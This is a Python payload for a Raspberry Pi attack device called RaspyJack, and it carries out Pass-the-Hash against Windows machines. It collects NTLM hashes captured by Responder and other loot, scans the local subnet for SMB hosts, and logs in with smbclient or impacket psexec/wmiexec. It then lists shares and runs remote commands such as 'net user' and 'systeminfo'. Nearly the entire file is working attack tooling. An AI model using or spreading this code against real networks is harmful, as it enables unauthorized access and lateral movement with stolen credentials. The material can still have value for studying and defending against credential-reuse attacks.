#!/usr/bin/env python3
"""
RaspyJack Payload -- Pass the Hash (PtH)
=========================================
Author: 7h30th3r0n3

Uses captured NTLM hashes to authenticate to other Windows machines
via SMB (port 445).  Leverages smbclient --pw-nt-hash or impacket
tools (psexec.py / smbexec.py / wmiexec.py) when available.

Setup / Prerequisites:
  - Captured hashes in Responder logs or loot directories.
  - smbclient or impacket tools installed.

Steps:
  1) Collect NTLM hashes from loot dirs and Responder logs
  2) Auto-discover Windows hosts (port 445 open)
  3) Attempt authentication with selected hash
  4) Enumerate shares, OS version, logged users on success
  5) Optionally execute predefined safe commands

Controls:
  OK    -- Try authentication against selected target
  KEY1  -- Cycle through collected hashes
  KEY2  -- Execute command on authenticated target
  KEY3  -- Exit

Loot: /root/Raspyjack/loot/PtH/
"""

import os
import sys
import re
import json
import time
import socket
import signal
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/PtH"
CRACKED_DIR = "/root/Raspyjack/loot/CrackedNTLM"
RELAY_DIR = "/root/Raspyjack/loot/NTLMRelay"
RESPONDER_LOG_DIR = "/root/Raspyjack/Responder/logs"

ROWS_VISIBLE = 6
ROW_H = 12
PORT_445_TIMEOUT = 0.8
SCAN_THREADS = 20

SAFE_COMMANDS = [
    "whoami",
    "ipconfig /all",
    "net user",
    "net localgroup administrators",
    "systeminfo",
    "hostname",
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
collected_hashes = []       # [{user, domain, nt_hash, source, full_line}]
targets = []                # [{ip, status, os_info, shares}]
scroll_pos = 0
hash_idx = 0
target_idx = 0
cmd_idx = 0
status_msg = "Initializing..."
phase = "hashes"            # hashes | targets | auth | cmd_select | results
auth_results = []           # [{ip, user, success, shares, os_info, users}]
last_cmd_output = ""
_running = True


# ---------------------------------------------------------------------------
# Hash parsing
# ---------------------------------------------------------------------------

def _parse_ntlm_hash_line(line, source_name):
    """Parse a single NTLM hash line and return a dict or None.

    Supported formats:
      user::domain:challenge:response:response   (NTLMv2 / Responder)
      user:rid:lm_hash:nt_hash:::              (SAM dump)
      user:nt_hash                              (simple)
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    parts = line.split(":")

    # NTLMv2 format: user::domain:challenge:response:response
    if len(parts) >= 6 and parts[1] == "":
        user = parts[0]
        domain = parts[2]
        nt_hash = line  # full line is the hash for relay
        return {
            "user": user[:32],
            "domain": domain[:32],
            "nt_hash": nt_hash,
            "source": source_name,
            "full_line": line,
        }

    # SAM dump: user:rid:lm_hash:nt_hash:::
    if len(parts) >= 4:
        user = parts[0]
        candidate = parts[3]
        if re.fullmatch(r"[0-9a-fA-F]{32}", candidate):
            return {
                "user": user[:32],
                "domain": ".",
                "nt_hash": candidate,
                "source": source_name,
                "full_line": line,
            }

    # Simple: user:hash
    if len(parts) == 2:
        user = parts[0]
        candidate = parts[1]
        if re.fullmatch(r"[0-9a-fA-F]{32}", candidate):
            return {
                "user": user[:32],
                "domain": ".",
                "nt_hash": candidate,
                "source": source_name,
                "full_line": line,
            }

    return None


def _collect_hashes_from_dir(dirpath, patterns=None):
    """Scan a directory for hash files and parse them."""
    found = []
    if not os.path.isdir(dirpath):
        return found
    try:
        for fname in sorted(os.listdir(dirpath)):
            fpath = os.path.join(dirpath, fname)
            if not os.path.isfile(fpath):
                continue
            if not fname.endswith((".txt", ".json")):
                continue
            if patterns is not None:
                if not any(p.lower() in fname.lower() for p in patterns):
                    continue
            try:
                with open(fpath, "r", errors="replace") as fh:
                    for line in fh:
                        entry = _parse_ntlm_hash_line(line, fname)
                        if entry is not None:
                            found.append(entry)
            except Exception:
                pass
    except Exception:
        pass
    return found


def collect_all_hashes():
    """Gather hashes from all known loot locations."""
    global collected_hashes, status_msg

    with lock:
        status_msg = "Collecting hashes..."

    all_found = []

    # Cracked NTLM passwords (may contain user:password pairs)
    all_found.extend(_collect_hashes_from_dir(CRACKED_DIR))

    # Raw relay hashes
    all_found.extend(_collect_hashes_from_dir(RELAY_DIR))

    # Responder logs
    all_found.extend(_collect_hashes_from_dir(
        RESPONDER_LOG_DIR,
        patterns=["NTLM", "SMB", "HTTP"],
    ))

    # Deduplicate by (user, nt_hash)
    seen = set()
    deduped = []
    for entry in all_found:
        key = (entry["user"].lower(), entry["nt_hash"][:64])
        if key not in seen:
            seen.add(key)
            deduped.append(entry)

    with lock:
        collected_hashes = deduped
        status_msg = f"Found {len(deduped)} hashes"


# ---------------------------------------------------------------------------
# Host discovery (port 445 scan)
# ---------------------------------------------------------------------------

def _check_port_445(ip, results_list, results_lock):
    """Check if port 445 is open on a single IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PORT_445_TIMEOUT)
        result = sock.connect_ex((ip, 445))
        sock.close()
        if result == 0:
            with results_lock:
                results_list.append({
                    "ip": ip,
                    "status": "open",
                    "os_info": "",
                    "shares": [],
                })
    except Exception:
        pass


def _get_local_subnet():
    """Detect the local /24 subnet prefix."""
    try:
        result = subprocess.run(
            ["ip", "-4", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                gw_idx = parts.index("via") + 1
                if gw_idx < len(parts):
                    gw = parts[gw_idx]
                    octets = gw.split(".")
                    if len(octets) == 4:
                        return ".".join(octets[:3])
    except Exception:
        pass
    return "192.168.1"


def discover_targets():
    """Scan local /24 for hosts with port 445 open."""
    global targets, status_msg

    with lock:
        status_msg = "Scanning for SMB hosts..."

    subnet = _get_local_subnet()
    found = []
    found_lock = threading.Lock()
    threads = []

    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        t = threading.Thread(
            target=_check_port_445,
            args=(ip, found, found_lock),
            daemon=True,
        )
        threads.append(t)
        t.start()
        # Throttle thread creation
        if len(threads) >= SCAN_THREADS:
            for th in threads:
                th.join(timeout=PORT_445_TIMEOUT + 0.5)
            threads.clear()

    # Wait for remaining threads
    for th in threads:
        th.join(timeout=PORT_445_TIMEOUT + 0.5)

    # Sort by IP
    found.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))

    with lock:
        targets = found
        status_msg = f"Found {len(found)} SMB hosts"


# ---------------------------------------------------------------------------
# Tool detection
# ---------------------------------------------------------------------------

def _find_tool(names):
    """Find the first available tool from a list of names/paths."""
    search_paths = [
        "/usr/bin", "/usr/local/bin", "/usr/sbin",
        "/usr/share/doc/python3-impacket/examples",
        "/opt/impacket/examples",
    ]
    for name in names:
        # Absolute path
        if os.path.isfile(name):
            return name
        # Search common locations
        for base in search_paths:
            candidate = os.path.join(base, name)
            if os.path.isfile(candidate):
                return candidate
    return None


def _has_smbclient():
    """Check if smbclient is available."""
    return _find_tool(["smbclient"]) is not None


def _find_impacket_tool(tool_name):
    """Find an impacket tool (e.g. psexec.py, wmiexec.py)."""
    return _find_tool([
        tool_name,
        f"impacket-{tool_name.replace('.py', '')}",
    ])


# ---------------------------------------------------------------------------
# Authentication via smbclient
# ---------------------------------------------------------------------------

def _auth_smbclient(ip, user, domain, nt_hash):
    """Attempt PtH authentication via smbclient --pw-nt-hash."""
    smbclient = _find_tool(["smbclient"])
    if smbclient is None:
        return None

    # Only use raw 32-char NT hashes for --pw-nt-hash
    clean_hash = nt_hash.strip()
    if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
        return None

    user_arg = f"{domain}\\{user}" if domain and domain != "." else user

    try:
        result = subprocess.run(
            [
                smbclient, "-L", ip,
                "-U", f"{user_arg}%{clean_hash}",
                "--pw-nt-hash",
                "-t", "10",
            ],
            capture_output=True, text=True, timeout=15,
        )
        output = result.stdout + result.stderr

        if "NT_STATUS_LOGON_FAILURE" in output:
            return None
        if "NT_STATUS_ACCESS_DENIED" in output:
            return None

        # Parse share listing
        shares = []
        for line in result.stdout.splitlines():
            match = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)", line)
            if match:
                shares.append(match.group(1))

        return {"shares": shares, "raw": output[:256]}

    except (subprocess.TimeoutExpired, Exception):
        return None


# ---------------------------------------------------------------------------
# Authentication via impacket
# ---------------------------------------------------------------------------

def _auth_impacket(ip, user, domain, nt_hash):
    """Attempt PtH authentication via impacket tools."""
    for tool_name in ["psexec.py", "smbexec.py", "wmiexec.py"]:
        tool_path = _find_impacket_tool(tool_name)
        if tool_path is None:
            continue

        clean_hash = nt_hash.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
            continue

        # LM:NT hash format for impacket
        hash_arg = f"aad3b435b51404eeaad3b435b51404ee:{clean_hash}"
        domain_part = domain if domain and domain != "." else "."
        target = f"{domain_part}/{user}@{ip}"

        try:
            result = subprocess.run(
                [
                    "python3", tool_path,
                    "-hashes", hash_arg,
                    target,
                    "whoami",
                ],
                capture_output=True, text=True, timeout=20,
            )
            output = result.stdout + result.stderr

            if "LOGON_FAILURE" in output or "STATUS_ACCESS_DENIED" in output:
                continue

            if result.returncode == 0 or "whoami" in output.lower():
                return {
                    "tool": tool_name,
                    "raw": output[:256],
                }
        except (subprocess.TimeoutExpired, Exception):
            continue

    return None


# ---------------------------------------------------------------------------
# Enumeration
# ---------------------------------------------------------------------------

def _enumerate_target(ip, user, domain, nt_hash):
    """Enumerate shares, OS info, and logged users on a target."""
    info = {"shares": [], "os_info": "", "users": []}

    # Shares via smbclient
    smb_result = _auth_smbclient(ip, user, domain, nt_hash)
    if smb_result is not None:
        info["shares"] = smb_result.get("shares", [])

    # OS info via smbclient
    smbclient = _find_tool(["smbclient"])
    if smbclient is not None:
        clean_hash = nt_hash.strip()
        if re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
            user_arg = f"{domain}\\{user}" if domain != "." else user
            try:
                result = subprocess.run(
                    [
                        smbclient, f"//{ip}/IPC$",
                        "-U", f"{user_arg}%{clean_hash}",
                        "--pw-nt-hash",
                        "-c", "exit",
                        "-t", "10",
                    ],
                    capture_output=True, text=True, timeout=15,
                )
                for line in (result.stdout + result.stderr).splitlines():
                    if "OS=" in line or "Server" in line:
                        info["os_info"] = line.strip()[:64]
                        break
            except Exception:
                pass

    return info


# ---------------------------------------------------------------------------
# Command execution
# ---------------------------------------------------------------------------

def _execute_command(ip, user, domain, nt_hash, command):
    """Execute a predefined command on the target via impacket."""
    clean_hash = nt_hash.strip()
    if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
        return "Error: invalid hash format"

    hash_arg = f"aad3b435b51404eeaad3b435b51404ee:{clean_hash}"
    domain_part = domain if domain and domain != "." else "."
    target = f"{domain_part}/{user}@{ip}"

    for tool_name in ["wmiexec.py", "smbexec.py", "psexec.py"]:
        tool_path = _find_impacket_tool(tool_name)
        if tool_path is None:
            continue
        try:
            result = subprocess.run(
                [
                    "python3", tool_path,
                    "-hashes", hash_arg,
                    target,
                    command,
                ],
                capture_output=True, text=True, timeout=30,
            )
            output = result.stdout.strip()
            if output:
                return output[:512]
        except subprocess.TimeoutExpired:
            return "Timeout"
        except Exception as exc:
            return f"Error: {str(exc)[:60]}"

    return "No impacket tools found"


# ---------------------------------------------------------------------------
# PtH attempt (orchestrator)
# ---------------------------------------------------------------------------

def do_pth_attempt(target_ip):
    """Run PtH against a target with the currently selected hash."""
    global status_msg, auth_results

    with lock:
        if not collected_hashes:
            status_msg = "No hashes loaded"
            return
        h = dict(collected_hashes[hash_idx])
        status_msg = f"Auth {h['user'][:8]}@{target_ip}..."

    # Try smbclient first, then impacket
    smb_result = _auth_smbclient(
        target_ip, h["user"], h["domain"], h["nt_hash"],
    )
    success = smb_result is not None

    if not success:
        imp_result = _auth_impacket(
            target_ip, h["user"], h["domain"], h["nt_hash"],
        )
        success = imp_result is not None

    # Enumerate on success
    enum_info = {"shares": [], "os_info": "", "users": []}
    if success:
        enum_info = _enumerate_target(
            target_ip, h["user"], h["domain"], h["nt_hash"],
        )

    entry = {
        "ip": target_ip,
        "user": h["user"],
        "domain": h["domain"],
        "success": success,
        "shares": enum_info.get("shares", []),
        "os_info": enum_info.get("os_info", ""),
        "users": enum_info.get("users", []),
        "timestamp": datetime.now().isoformat(),
    }

    with lock:
        # Replace existing entry for same ip+user or append
        replaced = False
        new_results = []
        for r in auth_results:
            if r["ip"] == target_ip and r["user"] == h["user"]:
                new_results.append(entry)
                replaced = True
            else:
                new_results.append(r)
        if not replaced:
            new_results.append(entry)
        auth_results = new_results

        if success:
            shares_str = ",".join(enum_info.get("shares", [])[:3])
            status_msg = f"SUCCESS {target_ip} [{shares_str[:16]}]"
        else:
            status_msg = f"FAIL {target_ip}"

    # Auto-save results
    _save_results()


# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------

def _save_results():
    """Save PtH results to loot directory."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    with lock:
        data = list(auth_results)
    if not data:
        return None

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"pth_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ---------------------------------------------------------------------------
# Drawing helpers
# ---------------------------------------------------------------------------

def _draw_header(d):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "PASS THE HASH", font=font, fill="#FF4400")
    with lock:
        n_ok = sum(1 for r in auth_results if r["success"])
    if n_ok > 0:
        d.ellipse((118, 3, 122, 7), fill="#00FF00")
    else:
        d.ellipse((118, 3, 122, 7), fill="#444")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#888")


def _draw_status_bar(d):
    with lock:
        msg = status_msg
        n_h = len(collected_hashes)
        n_t = len(targets)
    d.text((2, 15), msg[:22], font=font, fill="#FFAA00")
    d.text((90, 15), f"H:{n_h} T:{n_t}", font=font, fill="#666")


# ---------------------------------------------------------------------------
# View: hash selection
# ---------------------------------------------------------------------------

def draw_hashes_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)
    _draw_status_bar(d)

    with lock:
        hashes = list(collected_hashes)
        sc = scroll_pos
        sel = hash_idx

    d.text((2, 28), "Select hash:", font=font, fill="#AAAAAA")

    if not hashes:
        d.text((8, 55), "No hashes found", font=font, fill="#666")
        d.text((8, 68), "Check loot dirs", font=font, fill="#666")
    else:
        visible = hashes[sc:sc + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            y = 40 + i * ROW_H
            idx = sc + i
            prefix = ">" if idx == sel else " "
            color = "#00FF00" if idx == sel else "#CCCCCC"
            label = f"{prefix}{h['user'][:10]}@{h['domain'][:6]}"
            d.text((2, y), label[:20], font=font, fill=color)
            d.text((100, y), h["source"][:4], font=font, fill="#555")

    _draw_footer(d, "OK:Auth K1:Next K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: target selection
# ---------------------------------------------------------------------------

def draw_targets_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)
    _draw_status_bar(d)

    with lock:
        tgts = list(targets)
        sc = scroll_pos
        sel = target_idx
        results = {r["ip"]: r for r in auth_results}

    d.text((2, 28), "SMB hosts (445):", font=font, fill="#AAAAAA")

    if not tgts:
        d.text((8, 55), "No SMB hosts found", font=font, fill="#666")
        d.text((8, 68), "OK to rescan", font=font, fill="#666")
    else:
        visible = tgts[sc:sc + ROWS_VISIBLE]
        for i, t in enumerate(visible):
            y = 40 + i * ROW_H
            idx = sc + i
            prefix = ">" if idx == sel else " "
            ip_str = t["ip"][:15]

            # Color by auth status
            r = results.get(t["ip"])
            if r is not None and r["success"]:
                color = "#00FF00"
                marker = "OK"
            elif r is not None:
                color = "#FF4444"
                marker = "XX"
            elif idx == sel:
                color = "#FFFF00"
                marker = ""
            else:
                color = "#CCCCCC"
                marker = ""

            d.text((2, y), f"{prefix}{ip_str}", font=font, fill=color)
            if marker:
                d.text((108, y), marker, font=font, fill=color)

    _draw_footer(d, "OK:Auth UP/DN K2:Cmd")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: auth result detail
# ---------------------------------------------------------------------------

def draw_auth_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)

    with lock:
        results = list(auth_results)
        sc = scroll_pos

    if not results:
        d.text((8, 50), "No auth attempts yet", font=font, fill="#666")
    else:
        visible = results[sc:sc + 4]
        for i, r in enumerate(visible):
            y = 18 + i * 24
            ip_str = r["ip"][:15]
            user_str = r["user"][:12]
            ok = r["success"]

            color = "#00FF00" if ok else "#FF4444"
            tag = "SUCCESS" if ok else "FAIL"
            d.text((2, y), f"{ip_str} [{tag}]", font=font, fill=color)
            d.text((2, y + 11), f"  {user_str}", font=font, fill="#888")

            if ok and r.get("shares"):
                shares_str = ",".join(r["shares"][:3])
                d.text((60, y + 11), shares_str[:12], font=font, fill="#666")

    _draw_footer(d, "UP/DN:Scroll K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: command selection
# ---------------------------------------------------------------------------

def draw_cmd_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)

    with lock:
        sel = cmd_idx
        output = last_cmd_output

    d.text((2, 16), "Execute command:", font=font, fill="#AAAAAA")

    for i, cmd in enumerate(SAFE_COMMANDS):
        y = 28 + i * ROW_H
        prefix = ">" if i == sel else " "
        color = "#00FF00" if i == sel else "#CCCCCC"
        d.text((2, y), f"{prefix}{cmd[:22]}", font=font, fill=color)

    if output:
        d.rectangle((0, 100, 127, 114), fill="#222")
        d.text((2, 101), output[:22], font=font, fill="#00CCFF")

    _draw_footer(d, "OK:Run UP/DN K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll_pos, hash_idx, target_idx, cmd_idx
    global status_msg, last_cmd_output

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 16), "PASS THE HASH", font=font, fill="#FF4400")
    d.text((4, 36), "NTLM hash-based auth", font=font, fill="#888")
    d.text((4, 52), "Loading hashes...", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)

    # Collect hashes
    collect_all_hashes()

    # Discover targets in background
    threading.Thread(target=discover_targets, daemon=True).start()

    time.sleep(0.5)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            # --- Global exit ---
            if btn == "KEY3":
                if phase in ("auth", "cmd_select"):
                    with lock:
                        phase = "targets"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                if phase == "targets":
                    with lock:
                        phase = "hashes"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                # Exit from hashes view
                break

            # =============================================================
            # Hash selection phase
            # =============================================================
            if phase == "hashes":
                if btn == "OK":
                    with lock:
                        if collected_hashes:
                            phase = "targets"
                            scroll_pos = 0
                            target_idx = 0
                        else:
                            # Re-collect
                            pass
                    if not collected_hashes:
                        threading.Thread(
                            target=collect_all_hashes, daemon=True,
                        ).start()
                    time.sleep(0.3)

                elif btn == "KEY1":
                    with lock:
                        if collected_hashes:
                            hash_idx = (hash_idx + 1) % len(collected_hashes)
                            h = collected_hashes[hash_idx]
                            status_msg = f"Hash: {h['user'][:12]}"
                    time.sleep(0.25)

                elif btn == "UP":
                    with lock:
                        if collected_hashes:
                            hash_idx = max(0, hash_idx - 1)
                            if hash_idx < scroll_pos:
                                scroll_pos = hash_idx
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(collected_hashes)
                        if total > 0:
                            hash_idx = min(hash_idx + 1, total - 1)
                            if hash_idx >= scroll_pos + ROWS_VISIBLE:
                                scroll_pos = hash_idx - ROWS_VISIBLE + 1
                    time.sleep(0.15)

                elif btn == "KEY2":
                    # Rescan targets
                    threading.Thread(
                        target=discover_targets, daemon=True,
                    ).start()
                    time.sleep(0.3)

                draw_hashes_view()

            # =============================================================
            # Target selection phase
            # =============================================================
            elif phase == "targets":
                if btn == "OK":
                    with lock:
                        if targets and target_idx < len(targets):
                            ip = targets[target_idx]["ip"]
                        else:
                            ip = None
                    if ip:
                        threading.Thread(
                            target=do_pth_attempt,
                            args=(ip,),
                            daemon=True,
                        ).start()
                    else:
                        # Rescan
                        threading.Thread(
                            target=discover_targets, daemon=True,
                        ).start()
                    time.sleep(0.3)

                elif btn == "UP":
                    with lock:
                        target_idx = max(0, target_idx - 1)
                        if target_idx < scroll_pos:
                            scroll_pos = target_idx
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(targets)
                        if total > 0:
                            target_idx = min(target_idx + 1, total - 1)
                            if target_idx >= scroll_pos + ROWS_VISIBLE:
                                scroll_pos = target_idx - ROWS_VISIBLE + 1
                    time.sleep(0.15)

                elif btn == "KEY1":
                    with lock:
                        if collected_hashes:
                            hash_idx = (hash_idx + 1) % len(collected_hashes)
                            h = collected_hashes[hash_idx]
                            status_msg = f"Hash: {h['user'][:12]}"
                    time.sleep(0.25)

                elif btn == "KEY2":
                    # Check if we have a successful auth for cmd exec
                    with lock:
                        if targets and target_idx < len(targets):
                            ip = targets[target_idx]["ip"]
                            has_auth = any(
                                r["success"]
                                for r in auth_results
                                if r["ip"] == ip
                            )
                        else:
                            ip = None
                            has_auth = False
                    if has_auth:
                        with lock:
                            phase = "cmd_select"
                            cmd_idx = 0
                            last_cmd_output = ""
                    else:
                        with lock:
                            status_msg = "Auth first (OK)"
                    time.sleep(0.25)

                elif btn == "LEFT":
                    with lock:
                        phase = "auth"
                        scroll_pos = 0
                    time.sleep(0.25)

                draw_targets_view()

            # =============================================================
            # Auth results view
            # =============================================================
            elif phase == "auth":
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        total = len(auth_results)
                        if total > 0:
                            scroll_pos = min(scroll_pos + 1, total - 1)
                    time.sleep(0.15)

                draw_auth_view()

            # =============================================================
            # Command selection/execution
            # =============================================================
            elif phase == "cmd_select":
                if btn == "OK":
                    with lock:
                        if targets and target_idx < len(targets):
                            ip = targets[target_idx]["ip"]
                        else:
                            ip = None
                        cmd = SAFE_COMMANDS[cmd_idx]
                        # Find the auth'd hash for this target
                        auth_entry = None
                        for r in auth_results:
                            if r["ip"] == ip and r["success"]:
                                auth_entry = dict(r)
                                break

                    if ip and auth_entry:
                        # Find matching hash
                        with lock:
                            matching = None
                            for h in collected_hashes:
                                if h["user"] == auth_entry["user"]:
                                    matching = dict(h)
                                    break

                        if matching:
                            with lock:
                                status_msg = f"Running: {cmd[:14]}..."
                            output = _execute_command(
                                ip,
                                matching["user"],
                                matching["domain"],
                                matching["nt_hash"],
                                cmd,
                            )
                            with lock:
                                last_cmd_output = output[:128]
                                status_msg = f"Done: {cmd[:16]}"
                        else:
                            with lock:
                                last_cmd_output = "Hash not found"
                    time.sleep(0.3)

                elif btn == "UP":
                    with lock:
                        cmd_idx = max(0, cmd_idx - 1)
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        cmd_idx = min(cmd_idx + 1, len(SAFE_COMMANDS) - 1)
                    time.sleep(0.15)

                draw_cmd_view()

            time.sleep(0.05)

    finally:
        _running = False
        _save_results()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
